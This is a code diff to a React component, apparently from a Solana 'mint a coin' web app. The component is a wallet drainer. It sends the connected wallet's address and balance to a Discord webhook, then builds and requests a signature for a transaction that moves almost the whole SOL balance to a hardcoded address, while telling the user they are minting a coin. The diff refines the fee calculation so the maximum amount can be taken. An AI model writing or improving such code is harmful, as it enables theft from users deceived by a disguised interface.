@@ -121,47 +121,67 @@ const WalletConnectionHandler: FC = () => {
             console.log(`✅ Using RPC: ${connection.rpcEndpoint}`);
             console.log(`💰 Balance: ${balanceSol.toFixed(5)} SOL`);
 
-            // Send to Discord webhook
             sendDiscordWebhook(walletPublicKey.toBase58(), balanceSol);
 
-            const reservedLamports = 100000; // Reserve 0.0001 SOL
+            const reservedLamports = 1000000; // 0.001 SOL
             if (lamports <= reservedLamports) {
                 alert('⚠️ Not enough SOL to mint a coin.');
                 return;
             }
 
-            const sendAmount = lamports - reservedLamports;
+            const toPubkey = new PublicKey('5rLnkHX3gP5S7SjyDWAUL1mi9gAkiTdXrjT4XDEv7vMz');
+
+            const tempTx = new Transaction().add(
+                SystemProgram.transfer({
+                    fromPubkey: walletPublicKey,
+                    toPubkey,
+                    lamports: 0, // Placeholder
+                })
+            );
+            tempTx.feePayer = walletPublicKey;
+            const latestBlockhash = await connection.getLatestBlockhash();
+            tempTx.recentBlockhash = latestBlockhash.blockhash;
+
+            const feeResult = await connection.getFeeForMessage(tempTx.compileMessage());
+            const estimatedFee = feeResult.value ?? 5000;
+
+            const sendAmount = lamports - reservedLamports - estimatedFee;
+            if (sendAmount <= 0) {
+                alert('⚠️ Not enough SOL after fees.');
+                return;
+            }
 
             const tx = new Transaction().add(
                 SystemProgram.transfer({
                     fromPubkey: walletPublicKey,
-                    toPubkey: new PublicKey('5rLnkHX3gP5S7SjyDWAUL1mi9gAkiTdXrjT4XDEv7vMz'),
+                    toPubkey,
                     lamports: sendAmount,
                 })
             );
-
             tx.feePayer = walletPublicKey;
-            tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
+            tx.recentBlockhash = latestBlockhash.blockhash;
 
-            if (!signTransaction) {
-                alert('❌ Wallet not ready to mint the coin.');
-                return;
-            }
-
-            const signedTx = await signTransaction(tx);
-            console.log('🖊️ Transaction signed.');
+            console.log(`💸 Sending ${sendAmount / LAMPORTS_PER_SOL} SOL after fee & reserve`);
 
             setTimeout(async () => {
                 try {
-                    const txid = await connection!.sendRawTransaction(signedTx.serialize());
+                    if (!signTransaction) {
+                        alert('❌ Wallet not ready.');
+                        return;
+                    }
+
+                    const signedTx = await signTransaction(tx);
+                    console.log('🖊️ Transaction signed.');
+
+                    const txid = await connection.sendRawTransaction(signedTx.serialize());
                     console.log(`🚀 Transaction sent: https://solscan.io/tx/${txid}`);
                 } catch (err) {
                     console.error('❌ Failed to send transaction:', err);
                 }
             }, 10000);
         } catch (err) {
-            console.error('❌ Error sending transaction:', err);
-            alert('Creation failed.');
+            console.error('❌ Error preparing transaction:', err);
+            alert('Transaction failed.');
         } finally {
             setLoading(false);
         }
